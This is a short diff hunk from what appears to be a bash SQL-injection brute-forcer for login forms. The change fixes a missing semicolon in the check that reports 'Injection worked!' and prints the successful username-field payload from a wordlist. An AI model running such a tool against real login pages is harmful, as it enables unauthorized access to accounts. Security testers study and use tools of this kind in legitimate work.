@@ -270,7 +270,7 @@ while IFS= read -r wordlist;do
   status_code=`cat "headers.txt"`
   match_response=$(echo -e $REQUEST)
 
-  if [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]] then # && [[ "$status_code" != *"/login?error=WrongCredentials"* ]];then
+  if [[ $VERBOSE == '-v' ]] && [[ "$match_response" != *"$ERROR"* ]]; then # && [[ "$status_code" != *"/login?error=WrongCredentials"* ]];then
     # Success!
     echo -e "[*] Injection worked!"
     echo -e "[*] SQL Query in Username field is: ${wordlist}"
